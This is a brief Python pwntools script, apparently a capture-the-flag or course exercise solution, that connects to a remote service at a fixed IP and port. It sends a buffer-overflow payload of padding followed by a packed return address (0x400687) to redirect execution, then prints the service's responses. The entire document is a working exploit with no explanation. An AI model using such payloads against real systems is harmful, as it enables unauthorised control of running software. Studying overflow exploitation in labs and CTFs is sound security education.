
from pwn import *

r = remote("130.192.5.212", 1951)

r.recvline()

line = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + b'bbbbbbbb' + p64(0x400687)

r.sendline(line)

while True:
    print(r.recvline())